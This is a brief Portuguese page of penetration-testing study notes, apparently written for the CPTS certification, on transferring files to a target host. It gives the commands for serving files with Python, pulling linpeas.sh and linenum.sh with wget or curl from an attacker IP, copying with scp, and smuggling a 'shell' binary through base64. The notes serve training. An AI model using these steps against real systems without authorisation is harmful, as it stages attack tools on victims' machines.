> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/getting-started/transferring-files.md).

# Transferring Files

* Inicie um servidor web local

```sh
python3 -m http.server 8000
```

* Baixe um arquivo no servidor remoto da nossa máquina local

```sh
wget http://10.10.14.1:8000/linpeas.sh
```

* Baixe um arquivo no servidor remoto da nossa máquina local

```sh
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

* Transferir um arquivo para o servidor remoto com `scp`(requer acesso SSH)

```sh
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

* Converter um arquivo para`base64`

```sh
base64 shell -w 0
```

* Converter um arquivo de `base64`volta para seu original

```sh
echo f0VMR...SNIO...InmDwU | base64 -d > shell
```

* Verifique o arquivo `md5sum`para garantir que ele foi convertido corretamente

```sh
md5sum shell
```
